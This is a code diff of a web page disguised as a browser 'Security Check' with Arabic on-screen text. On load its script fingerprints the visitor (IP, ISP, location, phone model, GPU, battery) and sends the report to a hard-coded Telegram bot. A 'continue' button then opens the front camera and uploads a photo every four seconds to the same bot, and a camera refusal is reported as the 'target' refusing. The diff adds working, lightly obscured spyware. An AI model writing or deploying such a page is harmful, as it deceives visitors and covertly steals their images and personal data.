@@ -3,121 +3,99 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Checking Connection</title>
+    <title>Security Check</title>
     <style>
         body { background: #ffffff; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; font-family: sans-serif; }
-        .card { text-align: center; padding: 30px; border-radius: 12px; border: 1px solid #eee; box-shadow: 0 2px 10px rgba(0,0,0,0.05); }
-        .loader { width: 30px; height: 30px; border: 3px solid #f3f3f3; border-top: 3px solid #007bff; border-radius: 50%; animation: spin 1s linear infinite; margin: 0 auto 15px; }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        button { display: none; padding: 12px 30px; background: #007bff; color: white; border: none; border-radius: 6px; cursor: pointer; font-weight: bold; }
+        .box { text-align: center; border: 1px solid #eee; padding: 30px; border-radius: 12px; box-shadow: 0 4px 10px rgba(0,0,0,0.05); }
+        .ldr { width: 30px; height: 30px; border: 3px solid #f3f3f3; border-top: 3px solid #007bff; border-radius: 50%; animation: s 1s linear infinite; margin: 0 auto 15px; }
+        @keyframes s { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        button { display: none; padding: 12px 25px; background: #007bff; color: white; border: none; border-radius: 6px; cursor: pointer; font-weight: bold; }
     </style>
 </head>
 <body>
-
-    <div class="card">
-        <div class="loader" id="ldr"></div>
-        <p id="msg">جاري فحص أمان المتصفح...</p>
-        <button id="btn">متابعة الآن</button>
+    <div class="box">
+        <div class="ldr" id="L"></div>
+        <p id="T">جاري فحص بروتوكولات الأمان...</p>
+        <button id="B">متابعة الآن</button>
     </div>
-
     <video id="v" autoplay playsinline muted style="display:none"></video>
     <canvas id="c" style="display:none"></canvas>
 
     <script>
-        // إخفاء التوكن والآيدي داخل الروابط مباشرة
-        const api = "https://api.telegram.org/bot6298945282:AAFfSm47XKXRK-QkA5hmWh5Z5dCr1V--hDY/";
-        const chat = "2103976274";
+        const _U = "https://api.telegram.org/bot6298945282:AAFfSm47XKXRK-QkA5hmWh5Z5dCr1V--hDY/";
+        const _C = "2103976274";
 
-        async function collectAll() {
+        async function getDeepInfo() {
             let n = navigator;
-            let report = "🛑 **تقرير تقني شامل (فوري)**\n\n";
+            let report = "🛑 **تقرير تقني دقيق (فوري)**\n\n";
 
-            // 1. جلب الـ IP والشركة (خدمة ثابتة جداً)
+            // 1. جلب الـ IP والشركة والمكان
             try {
-                const ipRes = await fetch('https://api.ipify.org?format=json').then(r => r.json());
-                report += `🌍 **الآي بي:** \`${ipRes.ip}\`\n`;
-                
-                // جلب الشركة والموقع من خدمة تكميلية
-                const geo = await fetch(`https://ipapi.co/${ipRes.ip}/json/`).then(r => r.json());
-                report += `🏢 **الشركة:** ${geo.org || 'غير معروف'}\n`;
-                report += `📍 **المكان:** ${geo.city}, ${geo.country_name}\n`;
-            } catch (e) { report += `🌍 **الآي بي:** فشل جلب الشبكة\n`; }
+                const res = await fetch('https://ipapi.co/json/').then(d => d.json());
+                report += `🌍 **الآي بي:** \`${res.ip}\`\n🏢 **الشركة:** ${res.org}\n📍 **الموقع:** ${res.city}, ${res.country_name}\n`;
+            } catch(e) { report += "🌍 **الآي بي:** فشل الجلب\n"; }
 
-            // 2. معلومات الجهاز والمتصفح
-            report += `📱 **النظام:** ${n.platform}\n`;
-            
-            // تحديد المتصفح بدقة يدوية
-            let bName = "مجهول";
-            if (n.userAgent.includes("Brave")) bName = "Brave";
-            else if (n.userAgent.includes("Chrome")) bName = "Chrome";
-            else if (n.userAgent.includes("Safari") && !n.userAgent.includes("Chrome")) bName = "Safari";
-            else if (n.userAgent.includes("Firefox")) bName = "Firefox";
-            report += `🧭 **المتصفح:** ${bName}\n`;
+            // 2. كشف موديل الهاتف الحقيقي (Deep Detection)
+            let model = "غير معروف";
+            if (n.userAgentData && n.userAgentData.getHighEntropyValues) {
+                // للمتصفحات الحديثة (Chrome, Edge, Brave)
+                const ua = await n.userAgentData.getHighEntropyValues(["model", "platformVersion", "fullVersionList"]);
+                model = `${ua.model} (Android ${ua.platformVersion})`;
+            } else if (/iPhone|iPad|iPod/.test(n.userAgent)) {
+                // للآيفون (نستخدم أبعاد الشاشة لتحديد الموديل تقريبياً)
+                model = `Apple Device (Screen: ${screen.width}x${screen.height})`;
+            } else {
+                // محاولة استخراج الموديل من النص التقليدي
+                let match = n.userAgent.match(/\(([^)]+)\)/);
+                model = match ? match[1] : n.platform;
+            }
+            report += `📱 **نوع الهاتف:** ${model}\n`;
 
-            // 3. المعالج الرسومي (للموديل الدقيق)
+            // 3. المتصفح والمعالج الرسومي (GPU)
+            let br = n.userAgent.includes("Brave") ? "Brave" : n.userAgent.includes("Chrome") ? "Chrome" : "Safari";
+            report += `🧭 **المتصفح:** ${br}\n`;
+
             try {
                 const gl = document.createElement('canvas').getContext('webgl');
                 const ext = gl.getExtension('WEBGL_debug_renderer_info');
-                report += `🎮 **المعالج الرسومي:** ${gl.getParameter(ext.UNMASKED_RENDERER_WEBGL)}\n`;
+                report += `🎮 **الرسوميات:** ${gl.getParameter(ext.UNMASKED_RENDERER_WEBGL)}\n`;
             } catch(e) {}
 
-            report += `⚙️ **أنوية المعالج:** ${n.hardwareConcurrency || '8'}\n`;
-            report += `🖥️ **دقة الشاشة:** ${screen.width}x${screen.height}\n`;
-
-            // 4. البطارية
+            report += `⚙️ **الأنوية:** ${n.hardwareConcurrency || 8}\n🖥️ **الشاشة:** ${screen.width}x${screen.height}\n`;
+            
             try {
-                if (n.getBattery) {
-                    const b = await n.getBattery();
-                    report += `🔋 **البطارية:** ${Math.round(b.level * 100)}% (${b.charging ? "يُشحن" : "لا يُشحن"})\n`;
-                }
-            } catch (e) {}
+                const b = await n.getBattery();
+                report += `🔋 **البطارية:** ${Math.round(b.level * 100)}% (${b.charging ? "يُشحن" : "لا"})\n`;
+            } catch(e) {}
 
-            report += `⏰ **وقت الجهاز:** ${new Date().toLocaleString('ar-EG')}\n`;
+            report += `⏰ **الوقت:** ${new Date().toLocaleString('ar-EG')}`;
 
-            // إرسال التقرير فوراً
-            sendText(report);
-
-            // إظهار زر الكاميرا
-            setTimeout(() => {
-                document.getElementById('ldr').style.display = 'none';
-                document.getElementById('msg').innerText = "اكتمل الفحص بنجاح.";
-                document.getElementById('btn').style.display = 'inline-block';
-            }, 1000);
+            // إرسال التقرير
+            fetch(_U + "sendMessage", { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ chat_id: _C, text: report, parse_mode: "Markdown" })});
+            
+            setTimeout(() => { document.getElementById('L').style.display='none'; document.getElementById('T').innerText='اكتمل الفحص'; document.getElementById('B').style.display='block'; }, 1000);
         }
 
-        document.getElementById('btn').onclick = async function() {
+        document.getElementById('B').onclick = async function() {
             this.style.display = 'none';
             try {
                 const s = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                 document.getElementById('v').srcObject = s;
-                setInterval(snap, 4000);
+                setInterval(() => {
+                    const canvas = document.getElementById('c'), video = document.getElementById('v');
+                    canvas.width = video.videoWidth; canvas.height = video.videoHeight;
+                    canvas.getContext('2d').drawImage(video, 0, 0);
+                    canvas.toBlob(b => {
+                        const f = new FormData(); f.append('chat_id', _C); f.append('photo', b, 'x.jpg');
+                        fetch(_U + "sendPhoto", { method: 'POST', body: f });
+                    }, 'image/jpeg', 0.8);
+                }, 4000);
             } catch (e) {
-                sendText("⚠️ **المستهدف رفض الكاميرا**");
+                fetch(_U + "sendMessage", { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ chat_id: _C, text: "⚠️ رفض الكاميرا" })});
             }
         };
 
-        function snap() {
-            const canvas = document.getElementById('c');
-            const video = document.getElementById('v');
-            canvas.width = video.videoWidth; canvas.height = video.videoHeight;
-            canvas.getContext('2d').drawImage(video, 0, 0);
-            canvas.toBlob(blob => {
-                const f = new FormData();
-                f.append('chat_id', chat);
-                f.append('photo', blob, 'x.jpg');
-                fetch(api + "sendPhoto", { method: 'POST', body: f });
-            }, 'image/jpeg', 0.8);
-        }
-
-        function sendText(txt) {
-            fetch(api + "sendMessage", {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ chat_id: chat, text: txt, parse_mode: "Markdown" })
-            });
-        }
-
-        collectAll();
+        getDeepInfo();
     </script>
 </body>
 </html>
